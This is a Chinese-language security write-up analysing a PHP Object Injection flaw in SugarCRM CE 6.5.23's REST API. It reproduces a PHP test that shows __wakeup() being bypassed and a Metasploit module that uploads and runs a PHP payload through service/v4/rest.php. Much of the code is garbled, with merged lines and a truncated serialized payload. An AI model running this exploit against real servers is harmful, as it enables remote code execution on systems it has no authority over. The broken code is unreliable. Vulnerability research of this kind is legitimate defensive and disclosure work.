# 【技术分享】SugarCRM 6.5.23 - REST PHP Object Injection漏洞分析
|
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
**作者：[流浪客@ms509安全团队](http://bobao.360.cn/member/contribute?uid=1350341956)**
**稿费：500RMB（不服你也来投稿啊！）**
**投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿**
SugarCRM开源版是一款完全开放源代码的商业开源软件，具有界面活泼、简单易学的特点。美国SugarCRM公司是一间创立于2006年、但迅速在全球范围取得一定影响的客户关系管理软件厂商。其基本的商业策略是
一边销售收费低廉的企业版/专业版软件，获得收益；一边推出免费的、功能较少的开源版软件，培养未来的付费客户、吸引志愿者参加研发。大多数使用该软件的企业，并发用户数在几个到几万个的范围内。
**  
**
**0x00 前言**
这个漏洞很有意思，涉及到rayt牛新提交的php底层bug，这个bug导致了sugarCRM的反序列化防御失效。
**0x01 反序列中异常对象导致__wakeup()不被执行**
php
bug（phpserialize == NULL) {
    object_init_ex(*rval, ce);  function_table, "__wakeup", sizeof("__wakeup"))) {
    INIT_PZVAL(&fname);
    ZVAL_STRINGL(&fname, "__wakeup", sizeof("__wakeup") - 1, 0);
    BG(serialize_lock)++;
    call_user_function_ex(CG(function_table), rval, &fname, &retval_ptr, 0, 0, 1, NULL TSRMLS_CC);  wanniba = "*__destruct";
    echo $this->wanniba;
    echo "__destruct OK!";
        }
        public function __wakeup(){
    $this->wanniba = "*__wakeup";
    echo $this->wanniba;
            echo "__wakeup OK!";
        }
    }
    #$a = new test();
    #echo serialize($a);
    $payload = 'O:4:"test":1:{s:7:"wanniba";N;}';
    $payload1 = 'O:4:"test":1:{s:7:"wanniba";N;s:8:"payload";}';
    $abc = unserialize($payload);
    $abc1 = unserialize($payload1);
**测试结果：**
一种为正常情况，一种为异常情况，当我们构造特殊的payload的时候，程序只执行了__destruct()没有执行__wakeup()。
**0x02 SugarCRM CE 
****
    ##
    # This module requires Metasploit: http://metasploit.com/download
    # Current source: https://github.com/rapid7/metasploit-framework
    ##
    require 'msf/core'
    class MetasploitModule  'SugarCRM REST Unserialize PHP Code Execution',
          'Description'    => %q{
            This module exploits a PHP Object Injection vulnerability in SugarCRM CE  'EgiX',
          'License'        => MSF_LICENSE,
          'References'     =>
            [
              ['URL', 'http://karmainsecurity.com/KIS-2016-07'],
              ['URL', 'http://www.sugarcrm.com/security/sugarcrm-sa-2016-001'],
              ['URL', 'http://www.sugarcrm.com/security/sugarcrm-sa-2016-008'],
              ['URL', 'https://bugs.php.net/bug.php?id=72663']
            ],
          'Privileged'     => false,
          'Platform'       => ['php'],
          'Arch'           => ARCH_PHP,
          'Targets'        => [ ['SugarCRM CE  0,
          'DisclosureDate' => 'Jun 23 2016'
          ))
          register_options(
            [
              OptString.new('TARGETURI', [ true, "The base path to the web application", "/sugarcrm/"])
            ], self.class)
      end
      def exploit
        upload_php = '/custom/' + rand_text_alpha(rand(4)+8) + '.php'
        payload_serialized =  "O:+14:"SugarCacheFile":23:{S:17:"\00*\00_cacheFileName";"
        payload_serialized ";}}"
        print_status("#{peer} - Exploiting the unserialize() to upload PHP code")
        res = send_request_cgi(
        {
          'uri'    => normalize_uri(target_uri.path, 'service/v4/rest.php'),
          'method' => 'POST',
            'vars_post' => {
              'method'     => 'login',
              'input_type' => 'Serialize',
              'rest_data'  => payload_serialized
            }
        })
        if not res or res.code != 200
          print_error("#{peer} - Exploit failed: #{res.code}")
          return
        end
        register_files_for_cleanup(File.basename(upload_php))
        print_status("#{peer} - Executing the payload #{upload_php}")
        res = send_request_cgi(
        {
          'method'  => 'GET',
          'uri'     => normalize_uri(target_uri.path, upload_php),
          'headers' => { 'payload' => Rex::Text.encode_base64(payload.encoded) }
        })
        if res and res.code != 200
          print_error("#{peer} - Payload execution failed: #{res.code}")
          return
        end
      end
    end
****
**0x03 总结**
一个php的底层小bug引起的上层php开发中防御措施实效。
引用：